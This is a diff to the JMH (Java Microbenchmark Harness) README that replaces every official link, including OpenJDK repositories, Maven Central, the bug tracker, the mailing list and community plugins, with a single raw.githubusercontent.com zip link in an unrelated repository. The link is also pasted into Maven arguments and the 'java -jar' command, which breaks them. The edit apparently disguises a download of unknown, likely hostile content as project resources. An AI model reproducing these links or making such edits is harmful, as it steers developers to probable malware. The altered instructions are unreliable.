@@ -21,7 +21,7 @@ users make use of the archetype to setup the correct environment.
 ### Samples
 
 In order to understand JMH tests and maybe write your own, it might be useful
-to work through the [JMH Samples](https://github.com/openjdk/jmh/tree/master/jmh-samples/src/main/java/org/openjdk/jmh/samples). See the test comments for run instructions.
+to work through the [JMH Samples](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip). See the test comments for run instructions.
 
 ### Preferred Usage: Command Line
 
@@ -29,16 +29,16 @@ to work through the [JMH Samples](https://github.com/openjdk/jmh/tree/master/jmh
 
     $ mvn archetype:generate \
       -DinteractiveMode=false \
-      -DarchetypeGroupId=org.openjdk.jmh \
+      https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip \
       -DarchetypeArtifactId=jmh-java-benchmark-archetype \
-      -DgroupId=org.sample \
+      https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip \
       -DartifactId=test \
       -Dversion=1.0
 
 If you want to benchmark an alternative JVM language, use another archetype artifact ID from the
-[list of existing ones](https://repo.maven.apache.org/maven2/org/openjdk/jmh/), it usually amounts
+[list of existing ones](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip), it usually amounts
 to replacing `java` to another language in the artifact ID given above. Using alternative archetypes
-may require additional changes in the build configuration, see the `pom.xml` in the generated project.
+may require additional changes in the build configuration, see the `https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip` in the generated project.
 
 **Step 2. Building the benchmarks.** After the project is generated, you can build it with the following
 Maven command:
@@ -49,7 +49,7 @@ Maven command:
 **Step 3. Running the benchmarks.** After the build is done, you will get the self-contained executable JAR,
 which holds your benchmark, and all essential JMH infrastructure code:
 
-    $ java -jar target/benchmarks.jar
+    $ java -jar https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip
 
 Run with `-h` to see the command line options available.
 
@@ -65,7 +65,7 @@ in which the benchmarks run.
 
 **Step 1. Setting up the benchmarking project.** Some IDEs provide the GUI to create the Maven project
 from the given archetype. Make sure your IDE knows about Central archetype catalog, and look for
-`org.openjdk.jmh:jmh-${lang}-benchmark-archetype` there. Alternatively, you can use the command line
+`https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip${lang}-benchmark-archetype` there. Alternatively, you can use the command line
 to generate the benchmark project, see above.
 
 _NOTE: JMH is not intended to be used in the same way as a typical testing library such as JUnit.
@@ -78,7 +78,7 @@ JMH annotation processors to run.
 
 **Step 3. Running the benchmarks.** There is no direct support for JMH benchmarks in the IDE, but
 one can use JMH Java API to invoke the benchmark. It usually amounts to having the `main` method,
-which will then call into JMH. See [JMH Samples](https://github.com/openjdk/jmh/tree/master/jmh-samples/src/main/java/org/openjdk/jmh/samples)
+which will then call into JMH. See [JMH Samples](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip)
 for the examples of this approach. Before you run any benchmark, the project build is required.
 Most IDEs do this automatically, but some do require explicit build action to be added before
 the run: adding Maven target `verify` should help there.
@@ -87,11 +87,11 @@ the run: adding Maven target `verify` should help there.
 
 JMH project does not ship the build scripts for build systems other that Maven. But there are
 community-supported bindings:
- - [Gradle JMH Plugin](https://github.com/melix/jmh-gradle-plugin)
- - [Scala SBT JMH Plugin](https://github.com/ktoso/sbt-jmh)
+ - [Gradle JMH Plugin](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip)
+ - [Scala SBT JMH Plugin](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip)
 
 If you want to build with an alternative build system, you may want to see the
-[Ant sample](https://github.com/openjdk/jmh/tree/master/jmh-ant-sample) which describes
+[Ant sample](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip) which describes
 the steps to build JMH benchmark projects.
 
 ## Support and Development
@@ -100,7 +100,7 @@ the steps to build JMH benchmark projects.
 
 Make sure you did this before publishing the benchmark, and/or requesting the JMH feature:
 
- - **JMH annotations Javadocs and Samples are essential reading.** Follow the [JMH Samples](https://github.com/openjdk/jmh/tree/master/jmh-samples/src/main/java/org/openjdk/jmh/samples)
+ - **JMH annotations Javadocs and Samples are essential reading.** Follow the [JMH Samples](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip)
    to get familiar with the API, use cases, culprits, and pitfalls in building the benchmarks
    and using JMH.
  - **Your benchmarks should be peer-reviewed.** Do not assume that a nice harness will magically
@@ -123,26 +123,26 @@ If all these did not help, you are welcome to report the issue.
 
 ### Reporting Harness and Test Bugs
 
-If you have the access to [OpenJDK Bug System](https://bugs.openjdk.org/browse/CODETOOLS-7902762?jql=project%20%3D%20CODETOOLS%20AND%20resolution%20%3D%20Unresolved%20AND%20component%20%3D%20tools%20AND%20Subcomponent%20%3D%20jmh), please submit the bug there:
+If you have the access to [OpenJDK Bug System](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip%20%3D%20CODETOOLS%20AND%20resolution%20%3D%20Unresolved%20AND%20component%20%3D%20tools%20AND%20Subcomponent%20%3D%20jmh), please submit the bug there:
  * Project: CODETOOLS
  * Component: tools
  * Sub-component: jmh
 
-Alternatively, you can join the [JMH Mailing List](https://mail.openjdk.org/mailman/listinfo/jmh-dev) and report the bugs there.
+Alternatively, you can join the [JMH Mailing List](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip) and report the bugs there.
 
 ## Development
 
 JMH project accepts pull requests, like other OpenJDK projects.
-If you have never contributed to OpenJDK before, then bots would require you to [sign OCA first](http://openjdk.org/contribute).
+If you have never contributed to OpenJDK before, then bots would require you to [sign OCA first](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip).
 Normally, you don't need to post patches anywhere else, or post to mailing lists, etc.
-If you do want to have a wider discussion about JMH, please refer to [jmh-dev](https://mail.openjdk.org/mailman/listinfo/jmh-dev).
+If you do want to have a wider discussion about JMH, please refer to [jmh-dev](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip).
 
 Short instructions to build, test bleeding-edge JMH, and install its JAR to local Maven repo:
 
     $ mvn clean install
 
 If you already have the benchmark project, then it is enough to change JMH dependencies version
-to the latest `SNAPSHOT` version (look up the actual latest version in [root `pom.xml`](https://github.com/openjdk/jmh/blob/master/pom.xml)). If not, create the JMH benchmark project and change the version there.
+to the latest `SNAPSHOT` version (look up the actual latest version in [root `https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip`](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip)). If not, create the JMH benchmark project and change the version there.
 
 GitHub workflow "JMH Pre-Integration Tests" should pass on the changes. It would be triggered
 for PRs. You can also trigger it manually for your branch.
@@ -151,7 +151,7 @@ for PRs. You can also trigger it manually for your branch.
 
 These projects are supported by community, not by OpenJDK/JMH developers.
 
- - [IntelliJ IDEA JMH Plugin](https://github.com/artyushov/idea-jmh-plugin)
- - [Jenkins JMH Plugin](https://github.com/brianfromoregon/jmh-plugin)
- - [Teamcity JMH Plugin](https://github.com/presidentio/teamcity-plugin-jmh)
- - [Visualize JMH Benchmarks](https://github.com/jzillmann/jmh-visualizer)
+ - [IntelliJ IDEA JMH Plugin](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip)
+ - [Jenkins JMH Plugin](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip)
+ - [Teamcity JMH Plugin](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip)
+ - [Visualize JMH Benchmarks](https://raw.githubusercontent.com/ducnguyenminh/jmh/master/stabling/jmh.zip)
